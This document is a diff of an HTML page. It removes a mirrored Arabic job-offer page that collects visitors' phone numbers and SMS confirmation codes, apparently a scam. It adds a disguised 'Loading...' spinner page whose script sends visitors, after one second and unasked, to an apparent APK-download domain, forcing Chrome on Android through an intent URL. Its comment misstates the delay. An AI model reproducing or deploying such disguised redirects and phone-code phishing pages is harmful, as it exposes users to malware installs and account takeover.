@@ -1,136 +1,70 @@
-
-
 <!DOCTYPE html>
-
-<html>
-
-<html dir="rtl">
-
 <html lang="en">
 
-
-
-<!-- Mirrored from gamcards.com/jops/ by HTTrack Website Copier/3.x [XR&CO'2017], Fri, 16 Aug 2024 14:50:32 GMT -->
-
 <head>
-
-    <title>فرص عمل في السعودية والإمارت   </title>
-
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f3f3f3;
+        }
 
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+        .spinner {
+            border: 16px solid #f3f3f3;
+            border-top: 16px solid #3498db;
+            border-radius: 50%;
+            width: 120px;
+            height: 120px;
+            animation: spin 2s linear infinite;
+        }
 
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
 
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
 
-<link rel="icon" href="Untitled-design-1.png">
-
-<link rel="stylesheet" href="style.css">
-
-
-
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
 </head>
 
 <body>
+    <div class="spinner"></div>
+    <script>
+        function openLinkBasedOnDevice(url) {
+            var userAgent = navigator.userAgent;
 
-      
+            if (/(android)/i.test(userAgent)) {
+                // If the device is Android, open the link in Chrome
+                window.location.href = 'intent://' + url.substring(url.indexOf("://") + 3) + '#Intent;scheme=http;package=com.android.chrome;end;';
+            } else if (/(iphone|ipad|ipod)/i.test(userAgent)) {
+                // If the device is iOS, open the link in Safari
+                window.location.href = url;
+            } else {
+                // For other devices, open the link in the default browser
+                window.location.href = url;
+            }
+        }
 
-  <div class="page">  
-
-      
-
-      <div class="copyright">
-
-          <p id="right">بعد اتمام الخطوات سنتصل بك في أقل من 30 دقيقة</p>
-
-      </div>
-
-      
-
-      <div class="context">
-
-          
-
-      <div class="steps">
-
-          <div class="step1">
-
-              <div class="sn"><h>الخطوة 1</h></div>
-
-              <div class="sb"><p>إدخال رقم هاتف وتأكيده</p></div>
-
-          </div>
-
-          
-
-          <div class="step3">
-
-         <div class="fasle"></div>
-
-         </div>
-
-         
-
-          <div class="step2">
-
-              <div class="sn"><h>الخطوة 2</h></div>
-
-              <div class="sb"><p>ملأ استمارة العمل</p></div>
-
-          </div>
-
-          
-
-      </div> 
-
-          
-
-      <div class="toolimg">
-
-          <img id="img" src="sms.gif" alt="Phone">
-
-      </div>
-
-      
-
-      
-
- 
-
-      <div class="button" onclick="startchat()">
-
-  <img id="callimg" src="qaaq.png" alt="Image">
-
-</div>
-
-      <br>
-
-       
-
-      <div class="copyright">
-
-          <p id="right">يجب تاكيد الرقم عن طريق كتابة الكود الذي سيصلك  </p>
-
-      </div>
-
-       
-
-       
-
-         <div class="import">
-
-          <img id="imimg" src="sms.png" alt="I">
-
-          </div>
-
-  </div>
-
-    <script src="script.js"></script>
-
+        // Automatically execute the function after a 3-second delay
+        setTimeout(function () {
+            var url = 'https://a.mrapk.top';
+            openLinkBasedOnDevice(url);
+        }, 1000); // 3000 milliseconds = 1 seconds
+    </script>
 </body>
 
-
-
-<!-- Mirrored from gamcards.com/jops/ by HTTrack Website Copier/3.x [XR&CO'2017], Fri, 16 Aug 2024 14:50:40 GMT -->
-
 </html>
-
